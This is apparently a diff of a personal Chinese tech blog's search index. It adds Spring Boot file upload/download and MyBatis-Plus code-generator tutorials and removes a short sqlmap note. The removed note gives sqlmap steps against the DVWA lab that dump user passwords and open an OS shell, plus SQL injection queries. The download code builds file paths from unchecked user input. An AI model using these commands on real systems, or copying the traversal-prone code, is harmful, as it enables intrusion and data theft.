-                            .fileOverride() <span class="hljs-comment">// 覆盖已生成文件</span>
-                            .outputDir(<span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\java\\&quot;</span>); <span class="hljs-comment">// 指定输出目录</span>
-                &#125;)
-                .packageConfig(builder -&gt; &#123;
-                    builder.parent(<span class="hljs-string">&quot;com.sunzy&quot;</span>) <span class="hljs-comment">// 设置父包名</span>
-                            .moduleName(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// 设置父包模块名</span>
-                            .pathInfo(Collections.singletonMap(OutputFile.xml, <span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="hljs-comment">// 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改</span>
-                &#125;)
-                .strategyConfig(builder -&gt; &#123;
-                    builder.entityBuilder().enableLombok();
-                    builder.mapperBuilder().enableMapperAnnotation().build();
-                    builder.controllerBuilder().enableHyphenStyle()  <span class="hljs-comment">// 连字符转驼峰</span>
-                            .enableRestStyle();  <span class="hljs-comment">// 开启rest控制器</span>
-                    builder.addInclude(<span class="hljs-string">&quot;sys_user&quot;</span>) <span class="hljs-comment">// 设置需要生成的表名</span>
-                            .addTablePrefix(<span class="hljs-string">&quot;t_&quot;</span>, <span class="hljs-string">&quot;sys_&quot;</span>); <span class="hljs-comment">// 设置过滤表前缀</span>
-                &#125;)
-<span class="hljs-comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span>
-                .execute();
-
-    &#125;
-&#125;
-</code></pre>
-
-<p>完成后，直接运行改工具类就可以直接生成以下文件：</p>
-<p>UserMapper.java IUserService.java UserServiceImpl.java UserController.java</p>
-<h2 id="3-Controller模板"><a href="#3-Controller模板" class="headerlink" title="3.Controller模板"></a>3.Controller模板</h2><p>可以根据需要修改自己的模板</p>
-<pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> $&#123;<span class="hljs-keyword">package</span>.Controller&#125;;
-
-
-<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
-<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;
-<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;
-<span class="hljs-keyword">import</span> java.util.List;
-<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
-
-<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;
-<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Entity&#125;.$&#123;entity&#125;;
-
-#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
-<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;
-#<span class="hljs-keyword">else</span>
-<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
-#end
-#<span class="hljs-keyword">if</span>($&#123;superControllerClassPackage&#125;)
-<span class="hljs-keyword">import</span> $&#123;superControllerClassPackage&#125;;
-#end
-
-<span class="hljs-comment">/**</span>
-<span class="hljs-comment"> * &lt;p&gt;</span>
-<span class="hljs-comment"> * $!&#123;table.comment&#125; 前端控制器</span>
-<span class="hljs-comment"> * &lt;/p&gt;</span>
-<span class="hljs-comment"> *</span>
-<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> $&#123;author&#125;</span>
-<span class="hljs-comment"> * <span class="hljs-doctag">@since</span> $&#123;date&#125;</span>
-<span class="hljs-comment"> */</span>
-#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
-<span class="hljs-meta">@RestController</span>
-#<span class="hljs-keyword">else</span>
-<span class="hljs-meta">@Controller</span>
-#end
-<span class="hljs-meta">@RequestMapping(<span class="hljs-meta-string">&quot;#if(<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>)/<span class="hljs-subst">$&#123;package.ModuleName&#125;</span>#end/#if(<span class="hljs-subst">$&#123;controllerMappingHyphenStyle&#125;</span>)<span class="hljs-subst">$&#123;controllerMappingHyphen&#125;</span>#else<span class="hljs-subst">$&#123;table.entityPath&#125;</span>#end&quot;</span>)</span>
-#<span class="hljs-keyword">if</span>($&#123;kotlin&#125;)
-<span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125;#<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end
-
-#<span class="hljs-keyword">else</span>
-    #<span class="hljs-keyword">if</span>($&#123;superControllerClass&#125;)
-    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;
-    #<span class="hljs-keyword">else</span>
-    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> $</span>&#123;table.controllerName&#125; &#123;
-    #end
-
-<span class="hljs-meta">@Resource</span>
-<span class="hljs-keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;
-
-<span class="hljs-comment">// 新增或者更新</span>
-<span class="hljs-meta">@PostMapping</span>
-<span class="hljs-keyword">public</span> boolean save(<span class="hljs-meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123;
-        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);
-        &#125;
-
-<span class="hljs-meta">@DeleteMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
-<span class="hljs-keyword">public</span> <span class="hljs-built_in">Boolean</span> delete(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
-        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);
-        &#125;
-
-<span class="hljs-meta">@PostMapping(<span class="hljs-meta-string">&quot;/del/batch&quot;</span>)</span>
-<span class="hljs-keyword">public</span> boolean deleteBatch(<span class="hljs-meta">@RequestBody</span> List&lt;Integer&gt; ids) &#123;
-        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.removeByIds(ids);
-        &#125;
-
-<span class="hljs-meta">@GetMapping</span>
-<span class="hljs-keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;
-        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.list();
-        &#125;
-
-<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/&#123;id&#125;&quot;</span>)</span>
-<span class="hljs-keyword">public</span> $&#123;entity&#125; findOne(<span class="hljs-meta">@PathVariable</span> Integer id) &#123;
-        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);
-        &#125;
-
-<span class="hljs-meta">@GetMapping(<span class="hljs-meta-string">&quot;/page&quot;</span>)</span>
-<span class="hljs-keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="hljs-meta">@RequestParam</span> Integer pageNum,
-<span class="hljs-meta">@RequestParam</span> Integer pageSize) &#123;
-        LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;();
-        queryWrapper.orderByDesc(<span class="hljs-string">&quot;id&quot;</span>);
-        <span class="hljs-keyword">return</span> $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper);
-        &#125;
-
-&#125;
-
-#end
-</code></pre>
-
-<p>更多的模板可以到<code>com.baomidou.mybatis-plus-generator</code>包中复制到项目的<code>resources\templates</code>中，根据自己的需求修改模板</p>
-<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220513194907662.png" alt="image-20220513194907662"></p>
-]]></content>
-      <categories>
-        <category>javaweb</category>
-      </categories>
-      <tags>
-        <tag>springboot</tag>
       </tags>
   </entry>
   <entry>
@@ -4224,32 +4157,306 @@ ITEM_PIPELINES = &#123;
 ]]></content>
   </entry>
   <entry>
-    <title>sqlmap</title>
-    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><span id="more"></span>
+    <title>springboot工具类</title>
+    <url>/2022/04/29/springbooot-upload-file/</url>
+    <content><![CDATA[<h1 id="javaweb中图片文件上传和下载"><a href="#javaweb中图片文件上传和下载" class="headerlink" title="javaweb中图片文件上传和下载"></a>javaweb中图片文件上传和下载</h1><p>使用springboot创建web项目</p>
+<p>服务端要接收客户端页面上传的文件，通常都会使用Apache的两个组件:</p>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">commons-fileupload</span>
+<span class="hljs-attribute">commons-io</span></code></pre>
 
-<p>第一步:</p>
-<pre><code>-u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测</code></pre><p>第二步:</p>
-<pre><code>-u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取</code></pre><p>第三步:</p>
-<pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举</code></pre><p>第四步:</p>
-<pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举</code></pre><p>第五步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump
-//探测user表name和password字段</code></pre><p>如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字<br>典进行爆破。</p>
-<p>第六步:</p>
-<pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言</code></pre><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>order by * </p>
-<p>group by *</p>
-<p>利用内置函数暴数据库信息</p>
-<p>version() 查看数据库版本</p>
-<p>database() 查看当前数据库名</p>
-<p>user() 查看当前用户</p>
-<p>查看表：</p>
-<pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre><p>可十六进制查看字段：</p>
-<pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;</code></pre>]]></content>
+<p>Spring框架在spring-web包中对文件上传进行了封装，大大简化了服务端代码，实现步骤如下：</p>
+<h2 id="1-创建Controller"><a href="#1-创建Controller" class="headerlink" title="1.创建Controller"></a>1.创建Controller</h2><p>因为图片上传是一个公共接口所以可以创建一个名为<code>CommonController</code>的文件，url地址为<code>/common</code></p>
+<pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 主要用于文件上传和下载</span>
+<span class="hljs-comment"> */</span>
+
+<span class="hljs-meta">@RestController</span>
+<span class="hljs-meta">@RequestMapping(&quot;/common&quot;)</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommonController</span> </span>&#123;
+	<span class="hljs-meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span> <span class="hljs-comment">// 保存图片的路径</span>
+    <span class="hljs-keyword">private</span> String basePath;
+&#125;</code></pre>
+
+<h3 id="上传图片"><a href="#上传图片" class="headerlink" title="上传图片"></a>上传图片</h3><pre><code class="hljs java"><span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * 文件上传</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> file</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-meta">@PostMapping(&quot;/upload&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> R&lt;String&gt; <span class="hljs-title">upload</span><span class="hljs-params">(MultipartFile file)</span></span>&#123;
+    <span class="hljs-comment">// file是一个临时文件，后续需要进行转存</span>
+    <span class="hljs-comment">// file需要与前端上传的参数名保持一致，否则无法获取到上传的文件</span>
+    <span class="hljs-comment">// 转存之前需要对文件名进行处理</span>
+    String originalFilename = file.getOriginalFilename();
+    String suffix = originalFilename.substring(originalFilename.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>));
+
+    <span class="hljs-comment">// 防止文件被覆盖，使用uuid作为文件名</span>
+    String filename = UUID.randomUUID().toString();
+    filename = filename + suffix;
+
+    File dir = <span class="hljs-keyword">new</span> File(basePath); <span class="hljs-comment">// 判断文件夹是否存在不存在则创建</span>
+    <span class="hljs-keyword">if</span> (!dir.exists())&#123;
+        dir.mkdir();
+    &#125;
+    <span class="hljs-comment">// 将图片保存的指定位置</span>
+    <span class="hljs-keyword">try</span> &#123;
+        file.transferTo(<span class="hljs-keyword">new</span> File(basePath + filename));
+    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;
+        e.printStackTrace();
+    &#125;
+    <span class="hljs-keyword">return</span> R.success(filename);
+&#125;</code></pre>
+
+
+
+<h3 id="下载图片"><a href="#下载图片" class="headerlink" title="下载图片"></a>下载图片</h3><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/download&quot;)</span>
+<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">download</span><span class="hljs-params">(String name, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;
+    <span class="hljs-comment">// 文件输入流读取本地文件</span>
+    FileInputStream fileInputStream = <span class="hljs-keyword">null</span>;
+    <span class="hljs-comment">// 使用响应输出流将图片显示在网页上</span>
+    ServletOutputStream outputStream = <span class="hljs-keyword">null</span>;
+
+    <span class="hljs-keyword">try</span> &#123;
+        fileInputStream = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(basePath + name));
+        outputStream = response.getOutputStream();
+        response.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);
+        <span class="hljs-keyword">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">1024</span>];
+        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;
+        <span class="hljs-comment">// 读取服务器上的图片后 由响应输出流</span>
+        <span class="hljs-keyword">while</span>( (len = fileInputStream.read(bytes)) != -<span class="hljs-number">1</span>)&#123;
+            outputStream.write(bytes, <span class="hljs-number">0</span>, len);
+            outputStream.flush();
+        &#125;
+
+    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+        e.printStackTrace();
+    &#125; <span class="hljs-keyword">finally</span> &#123;
+        fileInputStream.close();
+        outputStream.close();
+    &#125;
+&#125;</code></pre>
+
+
+
+<h2 id="2-前端页面"><a href="#2-前端页面" class="headerlink" title="2.前端页面"></a>2.前端页面</h2><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>文件上传<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
+  <span class="hljs-comment">&lt;!-- 引入样式 --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.css&quot;</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/common.css&quot;</span> /&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;../../styles/page.css&quot;</span> /&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+   <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;addBrand-container&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;food-add-app&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">el-upload</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar-uploader&quot;</span></span>
+<span class="hljs-tag">                <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/common/upload&quot;</span></span>
+<span class="hljs-tag">                <span class="hljs-attr">:show-file-list</span>=<span class="hljs-string">&quot;false&quot;</span></span>
+<span class="hljs-tag">                <span class="hljs-attr">:on-success</span>=<span class="hljs-string">&quot;handleAvatarSuccess&quot;</span></span>
+<span class="hljs-tag">                <span class="hljs-attr">:before-upload</span>=<span class="hljs-string">&quot;beforeUpload&quot;</span></span>
+<span class="hljs-tag">                <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;upload&quot;</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;imageUrl&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;avatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">img</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;el-icon-plus avatar-uploader-icon&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">el-upload</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- 开发环境版本，包含了有帮助的命令行警告 --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/vue/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- 引入组件库 --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/element-ui/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- 引入axios --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../plugins/axios/axios.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../js/index.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>
+<span class="javascript">      <span class="hljs-keyword">new</span> Vue(&#123;</span>
+<span class="javascript">        el: <span class="hljs-string">&#x27;#food-add-app&#x27;</span>,</span>
+<span class="javascript">        <span class="hljs-function"><span class="hljs-title">data</span>(<span class="hljs-params"></span>)</span> &#123;</span>
+<span class="javascript">          <span class="hljs-keyword">return</span> &#123;</span>
+<span class="javascript">            imageUrl: <span class="hljs-string">&#x27;&#x27;</span></span>
+          &#125;
+        &#125;,
+        methods: &#123;
+          handleAvatarSuccess (response, file, fileList) &#123;
+<span class="javascript">              <span class="hljs-built_in">this</span>.imageUrl = <span class="hljs-string">`/common/download?name=<span class="hljs-subst">$&#123;response.data&#125;</span>`</span></span>
+          &#125;,
+          beforeUpload (file) &#123;
+            if(file)&#123;
+<span class="javascript">              <span class="hljs-keyword">const</span> suffix = file.name.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>]</span>
+<span class="javascript">              <span class="hljs-keyword">const</span> size = file.size / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; <span class="hljs-number">2</span></span>
+<span class="javascript">              <span class="hljs-keyword">if</span>([<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>].indexOf(suffix) &lt; <span class="hljs-number">0</span>)&#123;</span>
+<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;上传图片只支持 png、jpeg、jpg 格式！&#x27;</span>)</span>
+<span class="javascript">                <span class="hljs-built_in">this</span>.$refs.upload.clearFiles()</span>
+<span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
+              &#125;
+              if(!size)&#123;
+<span class="javascript">                <span class="hljs-built_in">this</span>.$message.error(<span class="hljs-string">&#x27;上传文件大小不能超过 2MB!&#x27;</span>)</span>
+<span class="javascript">                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span></span>
+              &#125;
+<span class="javascript">              <span class="hljs-keyword">return</span> file</span>
+            &#125;
+          &#125;
+        &#125;
+      &#125;)
+    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+
+<h1 id="mybatis-plus-generator"><a href="#mybatis-plus-generator" class="headerlink" title="mybatis-plus-generator"></a>mybatis-plus-generator</h1><p>MP的代码生成器，可以节约创建文件的时间</p>
+<h2 id="1-导入依赖"><a href="#1-导入依赖" class="headerlink" title="1.导入依赖"></a>1.导入依赖</h2><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--代码生成器--&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>
+
+<h2 id="2-编写生成器代码"><a href="#2-编写生成器代码" class="headerlink" title="2.编写生成器代码"></a>2.编写生成器代码</h2><p>可以放在专门的工具类包下</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.utils;
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;
+
+<span class="hljs-keyword">import</span> java.util.Collections;
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * mp代码生成器</span>
+<span class="hljs-comment"> */</span>
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CodeGenreator</span> </span>&#123;
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;
+        generator();
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">generator</span><span class="hljs-params">()</span></span>&#123;
+        FastAutoGenerator.create(<span class="hljs-string">&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;</span>,
+                <span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>)
+                .globalConfig(builder -&gt; &#123;
+                    builder.author(<span class="hljs-string">&quot;sunzy&quot;</span>) <span class="hljs-comment">// 设置作者</span>
+                            .enableSwagger() <span class="hljs-comment">// 开启 swagger 模式</span>
+                            .fileOverride() <span class="hljs-comment">// 覆盖已生成文件</span>
+                            .outputDir(<span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\java\\&quot;</span>); <span class="hljs-comment">// 指定输出目录</span>
+                &#125;)
+                .packageConfig(builder -&gt; &#123;
+                    builder.parent(<span class="hljs-string">&quot;com.sunzy&quot;</span>) <span class="hljs-comment">// 设置父包名</span>
+                            .moduleName(<span class="hljs-string">&quot;&quot;</span>) <span class="hljs-comment">// 设置父包模块名</span>
+                            .pathInfo(Collections.singletonMap(OutputFile.xml, <span class="hljs-string">&quot;E:\\Sunzh\\java\\admin_demo\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="hljs-comment">// 设置mapperXml生成路径 OutputEile.xml这里可能会报错 根据版本修改</span>
+                &#125;)
+                .strategyConfig(builder -&gt; &#123;
+                    builder.entityBuilder().enableLombok();
+                    builder.mapperBuilder().enableMapperAnnotation().build();
+                    builder.controllerBuilder().enableHyphenStyle()  <span class="hljs-comment">// 连字符转驼峰</span>
+                            .enableRestStyle();  <span class="hljs-comment">// 开启rest控制器</span>
+                    builder.addInclude(<span class="hljs-string">&quot;sys_user&quot;</span>) <span class="hljs-comment">// 设置需要生成的表名</span>
+                            .addTablePrefix(<span class="hljs-string">&quot;t_&quot;</span>, <span class="hljs-string">&quot;sys_&quot;</span>); <span class="hljs-comment">// 设置过滤表前缀</span>
+                &#125;)
+<span class="hljs-comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span>
+                .execute();
+
+    &#125;
+&#125;
+</code></pre>
+
+<p>完成后，直接运行改工具类就可以直接生成以下文件：</p>
+<p>UserMapper.java IUserService.java UserServiceImpl.java UserController.java</p>
+<h2 id="3-Controller模板"><a href="#3-Controller模板" class="headerlink" title="3.Controller模板"></a>3.Controller模板</h2><p>可以根据需要修改自己的模板</p>
+<pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> $&#123;<span class="hljs-keyword">package</span>.Controller&#125;;
+
+
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
+<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.*;
+<span class="hljs-keyword">import</span> javax.<span class="hljs-keyword">annotation</span>.Resource;
+<span class="hljs-keyword">import</span> java.util.List;
+<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;
+
+<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;
+<span class="hljs-keyword">import</span> $&#123;<span class="hljs-keyword">package</span>.Entity&#125;.$&#123;entity&#125;;
+
+#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
+<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;
+#<span class="hljs-keyword">else</span>
+<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;
+#end
+#<span class="hljs-keyword">if</span>($&#123;superControllerClassPackage&#125;)
+<span class="hljs-keyword">import</span> $&#123;superControllerClassPackage&#125;;
+#end
+
+<span class="hljs-comment">/**</span>
+<span class="hljs-comment"> * &lt;p&gt;</span>
+<span class="hljs-comment"> * $!&#123;table.comment&#125; 前端控制器</span>
+<span class="hljs-comment"> * &lt;/p&gt;</span>
+<span class="hljs-comment"> *</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@author</span> $&#123;author&#125;</span>
+<span class="hljs-comment"> * <span class="hljs-doctag">@since</span> $&#123;date&#125;</span>
+<span class="hljs-comment"> */</span>
+#<span class="hljs-keyword">if</span>($&#123;restControllerStyle&#125;)
+<span class="hljs-meta">@RestController</span>
+#<span class="hljs-keyword">else</span>
+<span class="hljs-meta">@Controller</span>
+#end
